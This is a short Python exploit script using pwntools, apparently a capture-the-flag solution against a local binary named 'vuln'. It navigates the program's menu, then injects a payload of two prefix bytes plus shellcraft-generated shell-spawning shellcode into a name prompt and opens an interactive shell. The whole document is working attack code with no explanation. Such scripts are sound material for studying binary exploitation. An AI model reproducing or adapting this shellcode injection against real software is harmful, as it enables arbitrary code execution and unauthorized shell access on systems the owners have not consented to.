from pwn import *


elf = ELF("./vuln")
p = process(elf.path)
context.log_level = "Debug"
context.arch = "amd64"
payload = b"\x00\xc0"
payload += bytes(asm(shellcraft.sh()))
p.recvuntil(b"the boat")
p.sendline(b"3")
p.recvuntil(b"name? ")
p.sendline(payload)
p.interactive()
